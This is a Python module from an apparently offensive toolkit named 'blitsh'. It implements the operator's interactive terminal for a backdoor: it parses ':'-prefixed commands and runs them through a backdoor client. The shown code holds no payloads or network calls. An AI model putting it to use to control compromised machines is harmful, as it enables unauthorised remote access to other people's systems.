"""This module defines the interactive shell used when connected to a
backdoor.
"""

import cmd
from collections import Counter
from typing import Iterable, List, Tuple

from blitsh.client import Client
from blitsh.commands import Command, NoOpArguments, ArgParseError


class Terminal(cmd.Cmd):
    """Holds the interactive terminal.

    The terminal allows to execute :class:`~blitsh.commands.base.Command`.
    Commands are launch by giving their name preceded by a ':' character.
    """
    intro = "Blitsh"
    prompt = '> '

    def __init__(self, client: Client, commands: Iterable[Command]={}) -> None:
        """Initiate the command line.

        The interactive loop won't start until the cmdloop method is called.

        :param client: The client to use to connect to a backdoor.
        :param commands: A list of commands to register in the terminal
        """
        self.client = client
        super().__init__(completekey='tab')

        # make sure commands are unique
        dup_command_names = [
            name
            for (name, count) in Counter([cmd.name for cmd in commands]).items()
            if count > 1]
        if dup_command_names:
            raise AttributeError(
                "Some command names are duplicated: {}".format(
                    ', '.join(dup_command_names)))

        self.commands = {cmd.name: cmd for cmd in commands}

    def parse_line(self, line: str) -> Tuple[str, List[str]]:
        """Parses a submited line.

        :returns: The formatted name of the command, and the arguments
            as a list.
        """
        args = [arg.strip() for arg in line.split()]
        empty_line = None, []  # type: Tuple[str, List[str]]

        if not args:
            return empty_line

        if args[0].startswith(':'):
            command_name = args[0][1:]
            if not command_name:
                return empty_line
            return command_name, args

        return empty_line

    def onecmd(self, line: str) -> bool:
        """Process a submitted line.

        :returns: True to stop the interactive shell loop.
        """
        command_name, args = self.parse_line(line)

        if command_name is None:
            return False

        try:
            command = self.commands[command_name]
        except KeyError:
            self.stdout.write("unknown command '%s'\n" % command_name)
            return False

        try:
            cmd_kwargs = command.parse_args(*args)
        except (NoOpArguments, ArgParseError) as e:
            self.stdout.write("%s\n" % e)
        else:
            self.stdout.write(command.execute(self.client, **cmd_kwargs))

        return False
